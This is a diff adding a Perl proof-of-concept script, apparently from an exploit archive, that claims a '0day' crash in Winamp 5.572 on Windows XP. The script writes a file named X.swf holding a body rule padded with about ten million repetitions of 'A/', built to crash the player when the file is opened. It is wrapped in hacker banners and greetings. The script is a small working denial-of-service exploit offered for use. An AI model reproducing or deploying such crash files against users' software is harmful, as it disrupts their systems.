@@ -1,0 +1,36 @@
+#!\C:\Perl\bin
+##################################{In The Name Of Allah The Mercifull}######################
+
+# Title : WiNamP V5.572 0day suffer from local CRASH PoC
+# Tested : Windows xp (sp3) 
+# AUThoR: R3d-D3v!L
+# Credits to : XP10_HACKER     XP10.ME
+
+print qq( 
+################################################### 
+## WiNamP V5.572 0day (SWF) local CRASH PoC      ## 
+## Credits : XP10.ME                             ## 
+##           XP10_HACKER                         ## 
+## Author : R3d-D3v!L       <X[at]hotmail.co.jp> ## 
+## Greetz : DR_DAShER   &  JUPA                  ## 
+## all member at XP10.ME                         ## 
+################################################### 
+);
+
+$XP10_hacker="\nbody {alink: "."A/" x 9999999 ."}\n"; 
+open(file ,'>>X.swf'); 
+print file $XP10_hacker; 
+print "CODED BY R3d-D3V!L~#\n";
+close(file); 
+
+#[~]-----------------------------{((MAGOUSH-87))}--------------------------------------- 
+#[~] Greetz tO: [dolly & MERNA & DEV!L_MODY & po!S!ON Sc0rp!0N & mAG0ush-1987]
+#[~]70 ALL ARAB!AN HACKER 3X3PT : LAM3RZ 
+#[~] spechial thanks : ab0 mohammed & XP_10 h4CK3R & JASM!N & c0prA & MARWA & N0RHAN & S4R4 
+#[?]spechial SupP0RT : MY M!ND  
+#[?]4r48!4n.!nforma7!0N.53cur!7y ---> ((r3d D3v!L<--M2Z--->JUPA<---aNd--->Devil ro0t)) 
+#[~]spechial FR!ND: 0r45hy
+#[~] !'M 4R48!4N 3XPL0!73R.
+#[~]{[(D!R 4ll 0R D!E)]}; 
+  
+#[~]---------------------------------------------------------------------------------------------
